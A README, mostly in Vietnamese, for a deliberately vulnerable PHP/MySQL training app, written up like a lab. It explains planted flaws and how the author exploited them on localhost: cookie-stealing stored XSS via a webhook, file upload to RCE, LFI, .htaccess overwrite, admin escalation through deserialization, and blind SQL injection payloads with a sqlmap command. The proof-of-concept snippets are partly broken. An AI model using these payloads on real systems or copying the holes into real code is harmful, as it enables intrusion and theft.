### Task 1 KCSC
- Technology : php, mysql, xdebug, mysqli

## I. Giới Thiệu : Demo basic vulnerability

# Login:
![Alt text](./image_Readme/image.png)
- Sau khi login sẽ chuyển đến index.php

# Remember user
- Click in remember me : hệ thống sẽ tự ghi nhớ user ghi đăng nhập lần tiếp theo


# Register
![Alt text](./image_Readme/image-1.png)
- Sau khi register sẽ chuyển đến login.php để đăng nhập

# Giao diện chính user

1, View post only by user
![Alt text](./image_Readme/image-2.png)

2, User can comment into post
![Alt text](./image_Readme/image-3.png)
![Alt text](./image_Readme/image-4.png)

3, User can view all of post by admin and click to read post details
![Alt text](./image_Readme/image-5.png)

# Giao diện phụ guest
![Alt text](./image_Readme/image-15.png)

# NavBar
![Alt text](./image_Readme/image-16.png)


# Menu user when click avatar option
If your role is admin, you can see dashboard else you can't
![Alt text](./image_Readme/image-6.png)
1, Dashboard admin only
  1.1, View main dashboard
  ![Alt text](./image_Readme/image-7.png)
  - Click in button  Back to MainPage to redirect index.php
  - Admin can see all of user
  ![Alt text](./image_Readme/image-8.png)

  1.2, Click in User in sidebar admin can see management users table have columns email, role, ...
  ![Alt text](./image_Readme/image-9.png)
  - Click in button Delete admin can delete this user
  - Click in button Edit admin can edit this user
  ![Alt text](./image_Readme/image-10.png)
  - Click in button Add user admin can view dialog add new user and click in add to add new user else close dialog
  ![Alt text](./image_Readme/image-11.png)

  1.3, Click in Post in sidebar admin can see management posts table have columns id, image, ...
  ![Alt text](./image_Readme/image-12.png)
  - Click in button Delete admin can delete this post
  - Click in button Edit admin can edit this post
  ![Alt text](./image_Readme/image-13.png)
  - Click in button Add post admin can view dialog add new post and click in add to add new post else close dialog
  ![Alt text](./image_Readme/image-14.png)
2, Change avatar
   ![Alt text](./image_Readme/image-17.png)
   You can upload file to use this avatar and we resize this avatar to 400x400

## II. Vulnerability in this demo APP

1, Store XSS

![Alt text](./image_Readme/image-18.png)
![Alt text](./image_Readme/image-19.png)
![Alt text](./image_Readme/image-20.png)
- Where edit and add users or port for admin
![Alt text](./image_Readme/image-28.png)

+ attack : có trong các trang index.php manage_post và user.
![Alt text](./image_rm/image.png)
- Sau khi login nếu click user_remember sẽ set cookie và check trong db có user không nếu có sẽ redirect qua trang index.php và set Session cho người dùng
- Sau đó em post 1 comment vào blog của admin hoặc bất kì user nào
![Alt text](./image_rm/image-1.png)
- Comment của em hiển thị với chức năng như 1 thẻ <script> trong page
![Alt text](./image_rm/image-2.png)
- Và đây là lỗ hổng store XSS vì em có lưu nội dung của comment trong database
![Alt text](./image_rm/image-3.png)
Bởi vì tất cả user sau khi đăng nhập đều có thể dùng page này nên em sẽ khai thác XSS<có thể thử hầu hết các payload của XSS và thành công> như sau: có thể dùng webhook hoặc pipedream.com để bắt cookie của victim ạ

- ở đây em dùng webhook
![Alt text](./image_rm/image-4.png)
Và sau khi load ảnh error thì sẽ gửi request đến webhook kèm cookie của nạn nhận với bất kì người dùng nào truy cập trang này
![Alt text](./image_rm/image-5.png)
![Alt text](./image_rm/image-6.png)



2, Upload file not filter basic
I will update filter for you try hard @@
![Alt text](./image_Readme/image-21.png)
![Alt text](./image_Readme/image-22.png)
![Alt text](./image_Readme/image-23.png) 


+attack:
![Alt text](./image_rm/image-7.png) 
- em upload 1 file php in ra nội dung của phpinfo();
![Alt text](./image_rm/image-8.png)
- Sau đó em mở file này ra thì được kết quả
![Alt text](./image_rm/image-9.png)
- Vậy là mình có thể upload bất kì đoạn code của php và RCE được sever

3, Local file inclusion <basic filter>
![Alt text](./image_Readme/image-24.png)
- Em truy cập vào trang guest.php và dùng fuff để fuzz thì tìm thấy có 1 param mà trang web nhận đó là page và sẽ include nội dung của bất kỳ file nào truyền vào
![Alt text](./image_rm/image-10.png)
- Em đọc được file .htaccess cho phép file txt được chạy như file php từ đó nếu đoạn upload file mà filter file php thì em có thể upload file txt và RCE tương tự như trên
- Em có thể đọc nội dung của bất kì trang nào bằng cách truyền vào param page này :<

4, Upload file to rewrite .htaccess
![Alt text](./image_Readme/image-25.png)
Example : I rewrite .htaccess allow run file txt same php
![Alt text](./image_Readme/image-26.png)
- có thể thấy là page đã hidden 1 ô input để điều khiển vị trị khi upload của người dùng
- Nếu em không thay đổi default thì page sẽ trỏ đến mặc định ạ còn nếu có thì sẽ gắn thêm path này vào route upload file
![Alt text](./image_rm/image-11.png)
- nên em sẽ lợi dụng để truyền thành upload via path traversal file .htaccess ạ
- Em để file .htaccess thành trống để xem thay đổi
![Alt text](./image_rm/image-12.png)
![Alt text](./image_rm/image-13.png)
- em đổi thành  ../../ để chuyển ra được thư mục chính cùng cấp với index và rewrite file .htaccess
![Alt text](./image_rm/image-14.png)
Lúc này em được quyền chạy file txt như là php và đây cũng là 1 cách đơn giản để vượt qua bypass đuôi file .php ạ.


5, Deserialize vulnerabilities
Chức năng remember me chứa lỗ hổng này . Khi remember me set remember_data và khi vào lại thì check cookie xem có không deserialize

attack :
- Khi mà login thì có check xem có ghi nhớ người dùng hay không Nếu mà có thì sau khi check user có tồn tại hay không thì sẽ seri sau đó sẽ serialize rồi base64 encode và lưu vào cookie với tên là user_remember
- Lần sau khi người dùng đăng nhập lại sẽ check nếu có cookie user_remember thì sẽ base64 decode và deserialize và gán thẳng vào $_SESSION của người dùng luôn nên lỗi ở đây là mình có thể chuyển role của người dùng thành admin và mình có thể authorization dasboard của admin ạ

![Alt text](./image_rm/image-15.png)
- Đây là hàm check ạ 
![Alt text](./image_rm/image-16.png)

Burp suite :
Em  tạo 1 tài khoản bất kì thì mặc định role là không phải admin sau đó em đăng nhập và ấn remeber me thì sẽ set user_remeber
POC.php
<?php
class User_remember
{
                                        private $id;
                                        private $username;
                                        private $email;
                                        private $admin;

                                        public function __construct($id, $username, $email, $admin)
                                        {
                                                                                $this->id = $id;
                                                                                $this->username = $username;
                                                                                $this->admin = $admin;
                                                                                $this->email = $email;
                                        }
                                        public function getName()
                                        {
                                                                                return $this->username;
                                        }
                                        public function getRole()
                                        {
                                                                                return $this->admin;
                                        }
                                        public function getId()
                                        {
                                                                                return  $this->id;
                                        }
                                        public function getEmail()
                                        {
                                                                                return $this->email;
                                        }
}

$attachment = new Attachment($id_default, $username_default, $email_default, 1);
echo base64_encode(serialize($attachment));

?>
sau đó 
POC.py
////
ookie = {'user_remember': base64_encode(serialize($attachment));}
r=requests.get(
    "http://localhost/task_KCSC/app/admin/index.php",
    cookies= cookie
)
data=json.loads(r.content.decode())
print(data['output'][4:])

///
cách bằng tay ạ :
![Alt text](./image_rm/image-18.png)
![Alt text](./image_rm/image-19.png)
Sau đó em chuyển thành 1 ở đoạn role 
![Alt text](./image_rm/image-20.png) 
và gắn vào lại cookie truy cập vào dasboard của admin
![Alt text](./image_rm/image-21.png)

-Em đang phát triển chức năng ghi logs to RCE<Lấy ý tưởng của KCSC recruite ạ>

6. Blind SQL injection
![Alt text](./image_Readme/image-29.png)
Hihi em không biết nên áp dụng blind sqli kiểu chi trong trường hợp product nên làm kiểu này ạ ^^

![Alt text](./image_rm/image-17.png)
- Đây là hàm dính lỗi ạ
![Alt text](./image_rm/image-22.png)
- nếu mà quản trị viên tìm email của user này nếu tồn tại sẽ trả về còn không thì sẽ không trả về gì ạ.
- Em sẽ sử dụng điều kiện và substring để dumb db ạ<em chưa dumb thử bằng sqlmap nhưng mà chắc cũng được ạ:v>
+ Đầu tiên em sẽ dùng payload email = llam16219@gmail.com' OR 1=1-- - câu lệnh query sẽ trở thành 
          "SELECT * FROM users WHERE email = 'llam16219@gmail.com' OR 1=1-- -'" đoạn sau sẽ comments và câu lệnh đúng
+ sau đó em chuyển thành "SELECT * FROM users WHERE email = 'llam16219@gmail.com' AND 1=1-- -'"
+ Để check rằng 2 điều kiện của em là luôn đúng thì sẽ trả ra exist user
![Alt text](./image_rm/image-23.png)
- Nếu em không biết trước loại database thì em sẽ check xem loại db gì và ở đây em đã thử được của mysql 
- Sau đó sẽ tìm thông tin password, email trong database của admin bằng cách sau 
          "SELECT * FROM users WHERE email = 'llam16219@gmail.com' AND (SELECT length(password) FROM users WHERE role=1 LIMIT 1)>'$a' -- -'"
- Chuyển các giá trị được đánh dấu đô la trong lệnh trên các list là number để check nếu không còn tồn tại User exists nữa thì sẽ là độ dài password tại đó

          "SELECT * FROM users WHERE email = 'llam16219@gmail.com' AND (SELECT SUBSTRING(password,$1,1) FROM users WHERE role=1 LIMIT 1)='$a' -- -'"
- Chuyển các giá trị được đánh dấu đô la trong lệnh trên các list là number và brute-force tất cả chữ cái chữ số và kí tự đặc biệt và chọn pitch-force để check hết tất cả
Hihi cái này em băm mật khẩu ra md5 nên nó khá lâu ạ nên em xin phép chuyển qua check username ạ :<
          "SELECT * FROM users WHERE email = 'llam16219@gmail.com'+AND+(SELECT+SUBSTRING(username,$1,1)+FROM+users+WHERE+role=1+LIMIT+1)+=+'$a'--+-'"
- có bước tìm length của password cũng tương tự ạ nhưng mà chỉ 1 payload number và dùng sniper ạ
![Alt text](./image_rm/image-25.png)
![Alt text](./image_rm/image-26.png)
![Alt text](./image_rm/image-27.png)
- Sau đó em chỉnh đoạn lọc của kết quả :
![Alt text](./image_rm/image-28.png)
+
![Alt text](./image_rm/image-29.png)
Đoạn cột 1 thì sẽ là vị trí của chuỗi ạ và đoạn code 2 là giá trị của chuỗi và ghép lại sẽ được username của user ạ
# Sử dụng sqlmap :
sqlmap -u "http://localhost/task_KCSC/app/admin/index.php" --data="email_exist=llam16219@gmail.com*&btn_emai_exist=" --method POST -dbs --batch để lấy tên tất cả các tables.



7, Cmd injection <đang phát triển> tại không biết nhiều ứng dụng khi dùng exec nên em chưa dùng nhiều :<
Trong main_upload_image để convert size image
![Alt text](./image_Readme/image-27.png)
mà tên file mình có thể config được nên có thể Blind Cmd injection mà này em chưa test linux nên chưa thử được ạ :3

8, Disclosure information
- Lộ file .htaccess and /robots.txt ạ:v


